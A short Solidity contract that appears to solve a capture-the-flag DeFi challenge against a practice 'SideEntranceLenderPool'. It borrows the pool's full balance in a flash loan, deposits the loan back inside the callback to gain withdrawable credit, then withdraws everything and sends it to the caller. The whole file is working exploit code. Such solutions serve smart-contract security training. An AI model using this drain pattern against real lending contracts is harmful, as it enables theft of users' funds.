// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract Attacker4 {
    SideEntranceLenderPool private pool;

    function attack(address _poolAddr) public {
        pool = SideEntranceLenderPool(_poolAddr);
        pool.flashLoan(_poolAddr.balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
